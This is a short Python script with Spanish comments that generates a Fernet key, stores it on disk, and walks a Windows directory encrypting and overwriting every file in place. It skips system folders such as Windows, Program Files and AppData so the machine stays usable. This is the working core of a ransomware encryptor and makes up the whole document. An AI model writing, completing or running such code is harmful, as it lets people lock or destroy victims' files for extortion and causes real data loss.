import os
from cryptography.fernet import Fernet
from tqdm import tqdm

# Ruta para guardar la clave de encriptación
key_path = 'C:\\enum2\\key.key'
if not os.path.exists(key_path):
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
else:
    with open(key_path, 'rb') as key_file:
        key = key_file.read()

cipher = Fernet(key)

# Lista de exclusiones
exclusions = [
    'C:\\Windows',
    'C:\\Program Files',
    'C:\\Program Files (x86)',
    'C:\\Users\\Default',
    'C:\\Users\\Public',
    'C:\\Users\\<Username>\\AppData',
    'C:\\Users\\<Username>\\NTUSER.DAT',
    'C:\\Users\\<Username>\\ntuser.dat.LOG1',
    'C:\\Users\\<Username>\\ntuser.dat.LOG2',
    'C:\\Users\\<Username>\\Local Settings',
    'C:\\Users\\<Username>\\LocalService',
    'C:\\Users\\<Username>\\NetworkService'
]

def should_exclude(path):
    for exclusion in exclusions:
        if path.startswith(exclusion):
            return True
    return False

def encrypt_and_overwrite_file(filepath):
    try:
        with open(filepath, 'rb') as file:
            data = file.read()
        
        encrypted_data = cipher.encrypt(data)
        
        with open(filepath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
    except Exception as e:
        print(f"Error encriptando el archivo {filepath}: {e}")

def encrypt_directory(root_dir):
    for dirpath, dirnames, filenames in os.walk(root_dir):
        if should_exclude(dirpath):
            continue
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            encrypt_and_overwrite_file(filepath)

# Ejecutar el encriptado del directorio raíz
encrypt_directory('C:\\enum')

print("Archivos encriptados y sobrescritos en su ubicación original.")
